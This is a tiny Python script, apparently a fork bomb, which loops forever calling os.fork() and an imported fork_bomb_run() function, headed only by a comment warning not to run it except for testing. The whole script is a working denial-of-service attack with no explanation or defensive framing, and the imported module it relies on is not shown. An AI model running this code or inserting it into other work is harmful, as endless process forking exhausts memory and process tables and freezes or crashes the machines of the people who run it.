### DO NOT RUN THIS UNLESS FOR TESTING PURPOSES!!!

import os
import fork_bomb_window as fork_bomb_window
from fork_bomb_window import *

while True:
    os.fork()
    fork_bomb_run()
